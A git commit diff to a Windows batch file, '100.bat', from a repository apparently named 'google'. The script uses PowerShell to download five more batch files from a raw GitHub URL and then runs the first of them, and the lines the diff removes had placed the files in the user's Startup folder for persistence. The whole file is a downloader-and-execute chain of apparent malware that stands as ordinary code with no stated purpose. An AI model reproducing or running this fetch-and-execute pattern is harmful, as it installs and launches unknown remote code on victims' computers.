6c7cca6918c34f35411a68c7bf24f270f7fb60dd
Victor Francis <cisfran05@protonmail.com>
2023-11-06 13:49:56 +0100

    Update 100.bat

--- 100.bat
+++ 100.bat
@@ -1,8 +1,6 @@
-@echo off
-cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Cisfran05/google/main/101.bat', '.\101.bat') }
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Cisfran05/google/main/102.bat', '.\102.bat') }
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Cisfran05/google/main/103.bat', '.\103.bat') }
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Cisfran05/google/main/104.bat', '.\104.bat') }
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Cisfran05/google/main/105.bat', '.\105.bat') }
-start 101.bat
+call .\101.bat
